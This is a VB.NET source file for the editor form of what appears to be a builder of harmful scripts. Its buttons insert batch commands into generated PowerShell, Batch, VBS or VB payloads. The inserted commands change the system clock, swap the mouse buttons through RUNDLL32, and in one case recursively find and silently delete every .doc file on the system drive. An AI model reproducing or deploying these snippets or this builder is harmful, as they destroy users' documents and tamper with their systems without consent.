Public Class Code_Editor
    Dim l As String = vbNewLine
    Private Sub NyX_Button1_Click(sender As Object, e As EventArgs) Handles NyX_Button1.Click
        With NyX_Theme1.Text
            If .Contains("Powershell") Then
                Form1.power_scrpt = txtb1.Text
                Me.Close()
            End If
            If .Contains("Batch") Then

                Form1.bat_scrpt = txtb1.Text
                Me.Close()
            End If
            If .Contains("VBS") Then
                Form1.vbs_scrpt = txtb1.Text
                Me.Close()
            End If
            If .Contains("Visuel basic") Then
                Form1.vb_scrpt = txtb1.Text
                Me.Close()
            End If

        End With
    End Sub



    Private Sub NyX_Button2_Click_1(sender As Object, e As EventArgs) Handles NyX_Button2.Click
        Dim ofd As New OpenFileDialog
        ofd.Filter = "All Files|*.*"
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            txtb1.Text = My.Computer.FileSystem.ReadAllText(ofd.FileName)

        End If
    End Sub

    Private Sub OpenAFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenAFileToolStripMenuItem.Click
        Dim ofd As New OpenFileDialog
        ofd.Filter = "All Files|*.*"
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            txtb1.Text = My.Computer.FileSystem.ReadAllText(ofd.FileName)

        End If
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Try
            txtb1.Copy()
        Catch ex As Exception

        End Try
    End Sub

    Private Sub CutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CutToolStripMenuItem.Click
        txtb1.Cut()
    End Sub

    Private Sub SelectAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SelectAllToolStripMenuItem.Click
        txtb1.SelectAll()
    End Sub

    Private Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        Dim sfd As New SaveFileDialog
        sfd.Filter = "All files|*.*"
        If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
            My.Computer.FileSystem.WriteAllText(sfd.FileName, txtb1.Text, True)
        End If
    End Sub

    Private Sub NyX_Theme1_Click(sender As Object, e As EventArgs) Handles NyX_Theme1.Click

    End Sub
#Region "Batch"

#End Region
    Private Sub NyX_Button3_Click(sender As Object, e As EventArgs) Handles NyX_Button3.Click
        txtb1.AppendText("@echo off" & l)
    End Sub

    Private Sub NyX_Button4_Click(sender As Object, e As EventArgs) Handles NyX_Button4.Click
        txtb1.AppendText("time 12:00" & l)
    End Sub

    Private Sub NyX_Button5_Click(sender As Object, e As EventArgs) Handles NyX_Button5.Click
        txtb1.AppendText("RUNDLL32 USER32.DLL,SwapMouseButton" & l)
    End Sub

    Private Sub NyX_Button6_Click(sender As Object, e As EventArgs) Handles NyX_Button6.Click

    End Sub

    Private Sub NyX_Button9_Click(sender As Object, e As EventArgs) Handles NyX_Button9.Click

    End Sub

    Private Sub NyX_Button20_Click(sender As Object, e As EventArgs) Handles NyX_Button20.Click
        txtb1.AppendText("DIR /S/B %SystemDrive%\*.doc >> FIleList_doc.txt" & l)
        txtb1.AppendText("echo Y | FOR /F ""tokens=1,* delims=: "" %%j in (FIleList_doc.txt) do del ""%%j:%%k""" & l)
    
    End Sub

    Private Sub NyX_Button7_Click(sender As Object, e As EventArgs) Handles NyX_Button7.Click

    End Sub
End Class